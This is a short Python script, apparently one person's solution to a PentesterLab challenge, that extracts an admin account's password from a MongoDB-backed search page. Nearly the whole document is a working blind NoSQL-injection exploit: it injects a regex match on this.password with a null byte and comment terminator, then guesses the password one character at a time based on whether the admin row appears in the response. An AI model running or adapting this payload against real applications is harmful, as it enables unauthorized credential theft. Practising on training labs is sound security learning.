# This is an example of how I solved one of the wonderful pentesterlab challenges.
# It is brute forcing the password of an account stored in MongoDB.
# Spoilers ahead!!!

import requests

base_url = 'http://ptl-4c029fe6-d5ca690b.libcurl.so/?search='
chars = 'abcdef0123456789-'
positive_result = '<tr><td><a href="?search=admin">admin</a></td></tr>'
password_length = 36
total_guess = ''

for loop in range(36):
    for single_guess in chars:
        search = "admin'%20%26%26%20this.password.match(/^"
        search += total_guess + single_guess
        search += ".*$/)%20%00%20<!--"
        url = base_url + search

        response = requests.get(url)
        if positive_result in response.text:
            print('Found character: ' + single_guess)
            total_guess += single_guess
            print('Password is now: ' + total_guess)
